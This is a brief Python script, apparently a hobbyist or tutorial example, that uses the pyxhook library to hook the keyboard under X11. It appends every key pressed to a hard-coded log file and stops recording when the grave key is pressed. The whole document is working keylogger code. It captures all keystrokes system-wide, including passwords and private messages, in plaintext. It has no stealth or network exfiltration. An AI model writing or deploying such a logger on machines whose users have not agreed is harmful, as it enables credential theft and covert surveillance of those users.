import pyxhook
#change this to your log file's path
log_file='/home/abhiven/Desktop/asd.log'

#this function is called everytime a key is pressed.
def OnKeyPress(event):
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write('\n')

  if event.Ascii==96: # grave key 
    fob.close()
    new_hook.cancel()

new_hook=pyxhook.HookManager()

new_hook.KeyDown=OnKeyPress

new_hook.HookKeyboard()

new_hook.start()
